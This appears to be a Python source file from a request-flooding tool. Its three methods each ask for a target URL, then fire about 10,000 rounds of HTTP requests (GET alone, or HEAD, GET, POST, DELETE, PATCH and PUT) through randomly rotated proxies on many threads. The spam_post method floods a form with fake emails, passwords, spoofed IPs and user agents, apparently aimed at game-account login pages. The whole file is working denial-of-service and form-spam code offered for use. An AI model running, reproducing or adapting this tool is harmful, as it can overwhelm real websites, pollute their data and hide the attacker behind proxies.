import random, chalk, os, asyncio, math, urllib, socket
from concurrent.futures import ThreadPoolExecutor
from time import perf_counter
from src.utils.functions import xhr, checkValidUrl, get_proxies, random_str, random_id, random_ip, random_user_agent
from src.utils.io import log, question
from src.constants.paths import PATH_PROGRAM

class Thread:
    @staticmethod
    def basic ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.basic()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_requests ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post", "delete", "patch", "put"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def spam_post ():
        url = question("input url target")
        total = 1000*10
        
        if not checkValidUrl(url):
            Thread.spam_post()
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        
        def func (iteration):
            methods = ["post", "get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                data = {
                  "email": f"{ random_str(100) }@gmail.com",
                  "pass": random_str(10),
                  "pass": random_str(10),
                  #"playid": random_id(9),
                  #"nick": random_str(9),
                  #"epass": "pernah",
                  #"tier": random.choice(["Bronze", "Master", "Silver", "Gold", "Platinum", "Grandmaster", "Diamond"]),
                  #"login": "Facebook",
                  "submit": "true",
                  "ua": random_user_agent(),
                  "ip": random_ip(),
                }
                for method in methods:
                    output = xhr(method, url, proxies=proxy, params={
                      "id": random_id(10*100),
                      "start": random_id(10*100),
                    }, data=data)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")